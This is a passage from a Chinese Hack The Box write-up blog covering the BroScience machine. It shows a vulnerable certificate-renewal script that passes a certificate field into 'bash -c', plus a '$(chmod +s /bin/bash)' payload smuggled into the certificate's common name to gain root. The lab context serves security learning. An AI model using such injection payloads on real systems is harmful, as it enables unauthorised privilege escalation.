<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 1 ] || [ <span class="variable">$1</span> == <span class="string">&quot;-h&quot;</span> ] || [ <span class="variable">$1</span> == <span class="string">&quot;--help&quot;</span> ] || [ <span class="variable">$1</span> == <span class="string">&quot;help&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> certificate.crt&quot;</span>;</span><br><span class="line">    <span class="built_in">exit</span> 0;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$1</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -checkend 86400 &gt; /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;No need to renew yet.&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span> 1;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    subject=$(openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -subject | <span class="built_in">cut</span> -d <span class="string">&quot;=&quot;</span> -f2-)</span><br><span class="line"></span><br><span class="line">    country=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;C = .&#123;2&#125;&#x27;</span>)</span><br><span class="line">    state=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;ST = .*,&#x27;</span>)</span><br><span class="line">    locality=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;L = .*,&#x27;</span>)</span><br><span class="line">    organization=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;O = .*,&#x27;</span>)</span><br><span class="line">    organizationUnit=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;OU = .*,&#x27;</span>)</span><br><span class="line">    commonName=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;CN = .*,?&#x27;</span>)</span><br><span class="line">    emailAddress=$(openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -email)</span><br><span class="line"></span><br><span class="line">    country=<span class="variable">$&#123;country:4&#125;</span></span><br><span class="line">    state=$(<span class="built_in">echo</span> <span class="variable">$&#123;state:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    locality=$(<span class="built_in">echo</span> <span class="variable">$&#123;locality:3&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    organization=$(<span class="built_in">echo</span> <span class="variable">$&#123;organization:4&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    organizationUnit=$(<span class="built_in">echo</span> <span class="variable">$&#123;organizationUnit:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    commonName=$(<span class="built_in">echo</span> <span class="variable">$&#123;commonName:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$subject</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Country     =&gt; <span class="variable">$country</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;State       =&gt; <span class="variable">$state</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Locality    =&gt; <span class="variable">$locality</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Org Name    =&gt; <span class="variable">$organization</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Org Unit    =&gt; <span class="variable">$organizationUnit</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Common Name =&gt; <span class="variable">$commonName</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Email       =&gt; <span class="variable">$emailAddress</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\nGenerating certificate...&quot;</span>;</span><br><span class="line">    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$country</span></span></span><br><span class="line"><span class="string">    <span class="variable">$state</span></span></span><br><span class="line"><span class="string">    <span class="variable">$locality</span></span></span><br><span class="line"><span class="string">    <span class="variable">$organization</span></span></span><br><span class="line"><span class="string">    <span class="variable">$organizationUnit</span></span></span><br><span class="line"><span class="string">    <span class="variable">$commonName</span></span></span><br><span class="line"><span class="string">    <span class="variable">$emailAddress</span></span></span><br><span class="line"><span class="string">    &quot;</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">    /bin/bash -c <span class="string">&quot;mv /tmp/temp.crt /home/bill/Certs/<span class="variable">$commonName</span>.crt&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -sha256 -nodes -newkey rsa:4096 -days 1 -keyout broscience.key -out broscience.crt </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(chmod +s /bin/bash)</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311193314360.png" alt="image-20230311193314360"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/htb-%E4%BA%8C/">htb(二)</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2016/04/20/19/47/wolves-1341881_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/c22bee3.html"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2017/05/09/03/46/alberta-2297204_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">春秋云镜(一)</div></div></a></div><div class="next-post pull-right"><a href="/5d7c4f5a.html"><img class="next-cover" src="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">hack the box 代理加速</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/6f842db4.html" title="Crypto"><img class="cover" src="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">Crypto</div></div></a></div><div><a href="/806d208a.html" title="slqilabs靶场记录堆叠注入(八)"><img class="cover" src="https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">slqilabs靶场记录堆叠注入(八)</div></div></a></div><div><a href="/cec1a58.html" title="sqlilabs靶场记录POST型(二)"><img class="cover" src="https://cdn.pixabay.com/photo/2018/11/17/22/15/trees-3822149_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">sqlilabs靶场记录POST型(二)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Oopsie"><span class="toc-number">1.</span> <span class="toc-text">Oopsie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vaccine"><span class="toc-number">2.</span> <span class="toc-text">Vaccine</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unified"><span class="toc-number">3.</span> <span class="toc-text">Unified</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Precious"><span class="toc-number">4.</span> <span class="toc-text">Precious</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stocker"><span class="toc-number">5.</span> <span class="toc-text">Stocker</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Soccer"><span class="toc-number">6.</span> <span class="toc-text">Soccer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MetaTwo"><span class="toc-number">7.</span> <span class="toc-text">MetaTwo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Investigation"><span class="toc-number">8.</span> <span class="toc-text">Investigation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mentor"><span class="toc-number">9.</span> <span class="toc-text">Mentor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BroScience"><span class="toc-number">10.</span> <span class="toc-text">BroScience</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
      avatar: 'monsterid',
      serverURLs: 'https://valine.wanan.red',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.wanan.red/8ed6b849.html'
    this.page.identifier = '/8ed6b849.html'
    this.page.title = 'htb(二)'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://www-wanan-red.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script>(function(d, w, c) {
    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
    var s = d.createElement('script');
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments);
    };
    s.async = true;
    s.src = 'https://call.chatra.io/chatra.js';
    if (d.head) d.head.appendChild(s);
})(document, window, 'Chatra');

if (true) {
  var chatBtnFn = () => {
    var chatBtn = document.getElementById("chat_btn")
    chatBtn.addEventListener("click", function(){
      Chatra('openChat')
    });
  }
  chatBtnFn()
} else {
  if (false) {
    function chatBtnHide () {
      Chatra('hide')
    }
    function chatBtnShow () {
      Chatra('show')
    }
  }
}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>